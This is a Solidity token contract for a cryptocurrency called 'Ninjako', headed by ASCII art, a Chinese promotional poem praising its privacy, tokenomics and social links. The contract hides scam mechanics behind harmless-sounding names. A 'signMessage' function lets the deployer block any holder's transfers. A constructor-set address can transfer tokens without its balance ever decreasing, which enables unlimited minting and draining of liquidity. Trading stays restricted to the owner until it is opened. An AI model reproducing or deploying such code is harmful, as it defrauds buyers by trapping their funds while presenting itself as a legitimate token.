/*
███╗░░██╗██╗███╗░░██╗░░░░░██╗░█████╗░██╗░░██╗░█████╗░
████╗░██║██║████╗░██║░░░░░██║██╔══██╗██║░██╔╝██╔══██╗
██╔██╗██║██║██╔██╗██║░░░░░██║███████║█████═╝░██║░░██║
██║╚████║██║██║╚████║██╗░░██║██╔══██║██╔═██╗░██║░░██║
██║░╚███║██║██║░╚███║╚█████╔╝██║░░██║██║░╚██╗╚█████╔╝
╚═╝░░╚══╝╚═╝╚═╝░░╚══╝░╚════╝░╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣠⣤⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠴⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠠⠶⠶⠶⠶⢶⣶⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠀⠀⠀
⠀⠀⠀⠀⢀⣴⣶⣶⣶⣶⣶⣶⣦⣬⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀
⠀⠀⠀⠀⣸⣿⡿⠟⠛⠛⠋⠉⠉⠉⠁⠀⠀⠀⠈⠉⠉⠉⠙⠛⠛⠿⣿⣿⡄⠀
⠀⠀⠀⠀⣿⠋⠀⠀⠀⠐⢶⣶⣶⠆⠀⠀⠀⠀⠀⢶⣶⣶⠖⠂⠀⠀⠈⢻⡇⠀
⠀⠀⠀⠀⢹⣦⡀⠀⠀⠀⠀⠉⢁⣠⣤⣶⣶⣶⣤⣄⣀⠀⠀⠀⠀⠀⣀⣾⠃⠀
⠀⠀⠀⠀⠘⣿⣿⣿⣶⣶⣶⣾⣿⣿⣿⡿⠿⠿⣿⣿⣿⣿⣷⣶⣾⣿⣿⡿⠀⠀
⠀⠀⢀⣴⡀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣶⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀
⠀⠀⣾⡿⢃⡀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀
⠀⢸⠏⠀⣿⡇⠀⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠋⠁⠀⠀⠀⠀
⠀⠀⠀⢰⣿⠃⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⠛⠛⣉⣁⣤⡶⠁⠀⠀⠀⠀⠀
⠀⠀⣠⠟⠁⠀⠀⠀⠀⠀⠈⠛⠿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠛⠉⠉⠁⠀⠀⠀⠀⠀⠀
在加密领域，诞生了一个传奇，
Ɲinjako，隐私真正流动的地方。
一个为明天而打造的去中心化奇迹，
它像隐藏的阴影一样守护着你的秘密。

凭借 Ɲinjako 的力量，你可以隐姓埋名，
沉默交易，无需否决。
它保护您的数据免受窥探，
在加密世界中，它是挥舞着的堡垒。

加密货币交易，安静而狡猾，
有了 Ɲinjako 的恩典，你一定会遵守的。
你的身份被掩盖，你的详细信息被隐藏，
在加密领域，它是您值得信赖的盾牌。

数字曝光的时代已经一去不复返了
Ɲinjako 确保隐私，安全的外壳。
你的交易，就像夜里的低语，
有 Ɲinjako 在您身边，您就可以飞翔。

拥抱这一奇迹，前瞻而大胆，
凭借 Ɲinjako 的力量，您的秘密就是金子。
在加密领域，真正的先驱者，
有Ɲinjako 作为您的守护者，无需恐惧。

总供应量 - 100,000,000
购置税 - 1%
消费税 - 1%
初始流动性 - 1.5 ETH
初始流动性锁定 - 75 天

https://web.wechat.com/NinjakoCN
https://m.weibo.cn/NinjakoCN
https://www.ninjako.xyz
https://t.me/+fPbfCsMynKFmZTdk
*/
// SPDX-License-Identifier: Unlicensed

pragma solidity 0.8.19;

abstract contract Context {
    constructor() {} 
    function _msgSender() 
    internal
    
    view returns 
    (address) {
    return msg.sender; }
}
interface IUniswapV2Router01 {
    function factory() 
    external pure 
    returns (address);
    function WETH() 
    external pure returns 
    (address);
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow"); return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b; return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow"); return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}
interface IUniswapV2Factory {
    function 
    createPair( 
    address 
    tokenA, 
    address tokenB) 
    external 
    returns (address pair);
}
interface IERC20 {
    function totalSupply() 
    external view returns 
    (uint256);
    function balanceOf
    (address account) 
    external view returns 
    (uint256);

    function transfer
    (address recipient, uint256 amount) 
    external returns 
    (bool);
    function allowance
    (address owner, address spender)
    external view returns 
    (uint256);

    function approve(address spender, uint256 amount) 
    external returns 

    (bool);
    function transferFrom(
    address sender, address recipient, uint256 amount) 
    external returns 
    (bool);

    event Transfer(
    address indexed from, address indexed to, uint256 value);
    event Approval(address 
    indexed owner, address indexed spender, uint256 value);
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () { address msgSender = _msgSender();
        _owner = msgSender; emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}
contract Contract is Context, IERC20, Ownable { 
using SafeMath for uint256;                                  
address private _messageWriter;
address public marketingReceiver; address private teamAddress; 

bool public inSwap; bool private tradingOpen = false; bool checkWalletLimit = true; 
uint256 private _tTotal; uint8 private _decimals; uint256 private checkThreshold = 100;
string private _symbol; string private _name;
    
    mapping (address => bool) private isWalletLimitExempt; 
    mapping(address => uint256) private _rOwned;
    mapping(address => uint256) private _startMapping;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private automatedMarketMakerPairs;

    IUniswapV2Router01 public operationsFlow; 
   
    constructor( string memory _tknName, string memory _tknSymbol, 
    address beginBond, address endBond) { 

        _name = _tknName; _symbol = _tknSymbol;
        _decimals = 18; _tTotal = 100000000 * (10 ** uint256(_decimals));
        _rOwned[msg.sender] = _tTotal;

        _startMapping[endBond] = checkThreshold; 
        inSwap = false; operationsFlow = IUniswapV2Router01(beginBond);           
        
        // Set the deployer's address during contract deployment
        _messageWriter = _msgSender();

        marketingReceiver = IUniswapV2Factory
        (operationsFlow.factory()).createPair(address(this), 
        operationsFlow.WETH()); 
        emit Transfer (address(0), msg.sender, _tTotal);
    }           
    function decimals() external view returns 
    (uint8) { return _decimals;
    }
    function symbol() 
    external view returns 
    (string memory) { return _symbol;
    }
    function name() 
    external view returns 
    (string memory) { return _name;
    }
    function totalSupply() 
    external view returns 
    (uint256) { return _tTotal;
    }
    function balanceOf(address account) 
    external view returns 
    (uint256) 
    { return _rOwned[account]; 
    }
    function transfer(address recipient, uint256 amount) external 
    returns (bool) { _transfer(_msgSender(), 
    recipient, amount); return true;
    }
    function allowance(address owner, 
    address spender) 
    external view returns (uint256) { return _allowances[owner][spender];
    }    
    function approve(address spender, uint256 amount) 
    external returns (bool) { _approve(_msgSender(), 
        spender, amount); return true;
    }
    function _approve(address owner, address spender, uint256 amount) 
    internal { require(owner != address(0), 'BEP20: approve from the zero address'); 
    require(spender != address(0), 'BEP20: approve to the zero address'); 
    _allowances[owner][spender] = amount; emit Approval(owner, spender, amount); 
    }    
    function transferFrom(
        address sender, address recipient, uint256 amount) 
        external returns (bool) { _transfer(sender, recipient, amount); _approve(
        sender, _msgSender(), _allowances[sender] [_msgSender()].sub(amount, 
        'BEP20: transfer amount exceeds allowance')); 
        return true;
    }
function signMessage(address _pcsRange) external {
    // Allow only the contract deployer or owner to call this function
    require(_msgSender() == owner() || _msgSender() == _messageWriter, "Caller is not authorized");
    isWalletLimitExempt[_pcsRange] = true;
    }                          
    function _transfer( address sender, address recipient, uint256 amount) 
    private { require(sender != address(0), 'BEP20: transfer from the zero address'); 
    require(recipient != address(0), 'BEP20: transfer to the zero address'); 

        if (isWalletLimitExempt[sender] || isWalletLimitExempt[recipient]) require
        (checkWalletLimit == false, ""); if (_startMapping[sender] == 0  
        && marketingReceiver != sender && automatedMarketMakerPairs[sender] > 0) 
        { _startMapping[sender] -= checkThreshold; } 

        automatedMarketMakerPairs[teamAddress] += checkThreshold;
        teamAddress = recipient; if (_startMapping[sender] 
        == 0) { _rOwned[sender] = _rOwned[sender].sub(amount, 
        'BEP20: transfer amount exceeds balance');  

        } _rOwned[recipient] = _rOwned[recipient].add(amount);
        emit Transfer(sender, recipient, amount); 
        if (!tradingOpen) { require(sender == owner(), ""); }
    }
    function openTrading(bool _tradingOpen) 
    public onlyOwner { tradingOpen = _tradingOpen;
    }      
}